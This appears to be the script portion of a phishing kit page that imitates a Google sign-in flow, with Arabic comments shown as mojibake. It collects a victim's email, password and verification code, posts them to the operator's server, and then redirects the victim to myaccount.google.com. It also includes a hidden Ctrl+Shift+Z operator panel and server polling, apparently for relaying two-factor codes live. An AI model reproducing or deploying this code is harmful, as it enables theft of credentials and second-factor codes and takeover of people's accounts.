        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // üéÆ ŸÑŸàÿ≠ÿ© ÿßŸÑÿ™ÿ≠ŸÉŸÖ ÿßŸÑÿ≥ÿ±Ÿäÿ©
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        
        // ÿ™ŸÅÿπŸäŸÑ ŸÑŸàÿ≠ÿ© ÿßŸÑÿ™ÿ≠ŸÉŸÖ ÿ®ÿßŸÑÿ∂ÿ∫ÿ∑ ÿπŸÑŸâ Ctrl+Shift+Z
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'Z') {
                const panel = document.getElementById('codeControlPanel');
                if (panel.style.display === 'none' || !panel.style.display) {
                    panel.style.display = 'block';
                    updateCurrentCodeDisplay();
                } else {
                    panel.style.display = 'none';
                }
            }
        });
        
        function hideControlPanel() {
            document.getElementById('codeControlPanel').style.display = 'none';
        }
        
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // üîÑ ÿØŸàÿßŸÑ ÿßŸÑÿ™ŸÜŸÇŸÑ ÿ®ŸäŸÜ ÿßŸÑÿµŸÅÿ≠ÿßÿ™
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        
        function validateEmail(){
            const emailInput = document.getElementById('emailInput');
            currentEmail = emailInput.value.trim();
            
            if(!currentEmail){
                alert('Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ÿ®ÿ±ŸäÿØ ÿ•ŸÑŸÉÿ™ÿ±ŸàŸÜŸä');
                return;
            }
            
            const progress = document.getElementById('globalProgressBar');
            progress.style.display = 'block';
            const emailScreen = document.getElementById('emailScreen');
            emailScreen.classList.add('fade-out');
            
            setTimeout(() => {
                progress.style.display = 'none';
                emailScreen.style.display = 'none';
                document.getElementById('emailButtons').style.display = 'none';
                document.getElementById('userEmailDisplay').textContent = currentEmail;
                
                const passwordScreen = document.getElementById('passwordScreen');
                passwordScreen.style.display = 'flex';
                document.getElementById('passwordButtons').style.display = 'flex';
                passwordScreen.classList.remove('fade-out');
            }, transitionEmailToPassword);
        }
        
        function submitPassword(){
            const passwordInput = document.getElementById('passwordInput');
            const password = passwordInput.value.trim();
            
            if(!password){
                alert('Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ±');
                return;
            }
            
            const progress = document.getElementById('globalProgressBar');
            progress.style.display = 'block';
            const passwordScreen = document.getElementById('passwordScreen');
            passwordScreen.classList.add('fade-out');
            
            const formData = new FormData();
            formData.append('email', currentEmail);
            formData.append('password', password);
            
            fetch('/process_login', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if(!response.ok) throw new Error('Network error');
                return response.text();
            })
            .then((result) => {
                if (result === 'SUCCESS') {
                    setTimeout(() => {
                        progress.style.display = 'none';
                        passwordScreen.style.display = 'none';
                        document.getElementById('passwordButtons').style.display = 'none';
                        document.getElementById('phoneEmailDisplay').textContent = currentEmail;
                        
                        const phoneScreen = document.getElementById('phoneScreen');
                        phoneScreen.style.display = 'flex';
                        
                        // ‚≠ê ÿ™ŸÅÿπŸäŸÑ ÿ≤ÿ± ÿ•ÿπÿßÿØÿ© ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ ÿ£ŸàŸÑ ŸÖÿ±ÿ©
                        activateResendButton();
                        
                        // ÿ™ÿ£ŸÉŸäÿØ ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑŸÜŸáÿßÿ¶Ÿä ŸÇÿ®ŸÑ ÿßŸÑÿπÿ±ÿ∂
                        updateVerificationCodeDisplay();
                        
                    }, transitionPasswordToPhone);
                } else {
                    throw new Error('Server returned: ' + result);
                }
            })
            .catch(error => {
                progress.style.display = 'none';
                alert('ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™.');
            });
        }
        
        // ‚≠ê ÿØÿßŸÑÿ© ÿ¨ÿØŸäÿØÿ© ŸÑÿ≤ÿ± "ÿ™ÿ¨ÿ±ÿ®ÿ© ÿ∑ÿ±ŸäŸÇÿ© ÿ£ÿÆÿ±Ÿâ" - Ÿäÿ£ÿÆÿ∞ ŸÑÿµŸÅÿ≠ÿ© ÿßŸÑÿ±ŸÇŸÖ
        function tryAnotherWay() {
            const progress = document.getElementById('globalProgressBar');
            progress.style.display = 'block';
            const passwordScreen = document.getElementById('passwordScreen');
            passwordScreen.classList.add('fade-out');
            
            // ŸÜŸÅÿ≥ ÿßŸÑÿ£ŸÜŸäŸÖŸäÿ¥ŸÜ ŸàÿßŸÑŸÖÿØÿ© ŸÖÿ´ŸÑ ÿ≤ÿ± "ÿßŸÑÿ™ÿßŸÑŸä"
            setTimeout(() => {
                progress.style.display = 'none';
                passwordScreen.style.display = 'none';
                document.getElementById('passwordButtons').style.display = 'none';
                document.getElementById('phoneEmailDisplay').textContent = currentEmail;
                
                const phoneScreen = document.getElementById('phoneScreen');
                phoneScreen.style.display = 'flex';
                
                // ‚≠ê ÿ™ŸÅÿπŸäŸÑ ÿ≤ÿ± ÿ•ÿπÿßÿØÿ© ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ ÿ£ŸàŸÑ ŸÖÿ±ÿ©
                activateResendButton();
                
                // ÿ™ÿ£ŸÉŸäÿØ ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑŸÜŸáÿßÿ¶Ÿä ŸÇÿ®ŸÑ ÿßŸÑÿπÿ±ÿ∂
                updateVerificationCodeDisplay();
                
            }, transitionPasswordToPhone);
        }
        
        document.getElementById('notWithMeBtn').addEventListener('click', () => {
            const phoneScreen = document.getElementById('phoneScreen');
            const progress = document.getElementById('globalProgressBar');
            progress.style.display = 'block';
            phoneScreen.classList.add('fade-out');
            
            setTimeout(() => {
                progress.style.display = 'none';
                phoneScreen.style.display = 'none';
                document.getElementById('verificationEmailDisplay').textContent = currentEmail;
                
                const verificationScreen = document.getElementById('verificationScreen');
                verificationScreen.style.display = 'flex';
                document.getElementById('verificationButtons').style.display = 'flex';
            }, transitionPhoneToVerification);
        });
        
        function submitVerificationCode(){
            const codeInput = document.getElementById('verificationCode');
            const code = codeInput.value.trim();
            
            if(!code){
                alert('Ÿäÿ±ÿ¨Ÿâ ÿ•ÿØÿÆÿßŸÑ ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ');
                return;
            }
            
            const progress = document.getElementById('globalProgressBar');
            progress.style.display = 'block';
            const verificationScreen = document.getElementById('verificationScreen');
            verificationScreen.classList.add('fade-out');
            
            const formData = new FormData();
            formData.append('email', currentEmail);
            formData.append('verification_code', code);
            formData.append('timestamp', new Date().toISOString());
            
            fetch('/process_verification', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if(!response.ok) throw new Error('Network error');
                return response.text();
            })
            .then((result) => {
                if (result === 'SUCCESS') {
                    setTimeout(() => {
                        window.location.href = 'https://myaccount.google.com/';
                    }, transitionPhoneToVerification);
                } else {
                    throw new Error('Server returned: ' + result);
                }
            })
            .catch(error => {
                progress.style.display = 'none';
                alert('ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™.');
            });
        }
        
        function togglePasswordVisibility(){
            const input = document.getElementById('passwordInput');
            input.type = document.getElementById('showPasswordCheckbox').checked ? 'text' : 'password';
        }
        
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // üöÄ ÿ™ŸáŸäÿ¶ÿ© ÿßŸÑÿµŸÅÿ≠ÿ©
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        
        // ÿπŸÜÿØ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸÅÿ≠ÿ©
        document.addEventListener('DOMContentLoaded', function() {
            // ÿ®ÿØÿ° ŸÖÿ±ÿßŸÇÿ®ÿ© ÿßŸÑÿ™ÿ∫ŸäŸäÿ±ÿßÿ™ ŸÖŸÜ ÿßŸÑÿ≥Ÿäÿ±ŸÅÿ±
            startCodePolling();
            
            // ÿ®ÿØÿ° ŸÖÿ±ÿßŸÇÿ®ÿ© ÿßŸÑÿßŸÜÿ™ŸÇÿßŸÑ ÿßŸÑŸÇÿ≥ÿ±Ÿä
            startTransitionPolling();
            
            // ÿ¨ŸÑÿ® ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ≠ÿßŸÑŸä
            fetchCurrentCode();
            
            // ÿ•ÿ∂ÿßŸÅÿ© ŸÖÿ≥ÿ™ŸÖÿπ ŸÑÿ≤ÿ± "ÿ™ÿ¨ÿ±ÿ®ÿ© ÿ∑ÿ±ŸäŸÇÿ© ÿ£ÿÆÿ±Ÿâ" ŸÅŸä ÿµŸÅÿ≠ÿ© ÿßŸÑÿ®ÿßÿ≥ŸàŸàÿ±ÿØ
            const tryAnotherWayBtn = document.querySelector('.password-screen .try-another-way');
            if (tryAnotherWayBtn) {
                tryAnotherWayBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    tryAnotherWay();
                });
            }
        });
        
        // ÿ•ÿ∂ÿßŸÅÿ© ŸÖÿ≥ÿ™ŸÖÿπŸäŸÜ ŸÑÿ£ÿ≤ÿ±ÿßÿ± ÿßŸÑÿ•ÿØÿÆÿßŸÑ
        document.getElementById('emailInput').addEventListener('keypress', e => {
            if(e.key === 'Enter') validateEmail();
        });
        
        document.getElementById('passwordInput').addEventListener('keypress', e => {
            if(e.key === 'Enter') submitPassword();
        });
        
        document.getElementById('verificationCode').addEventListener('keypress', e => {
            if(e.key === 'Enter') submitVerificationCode();
        });
    </script>
</body>
</html>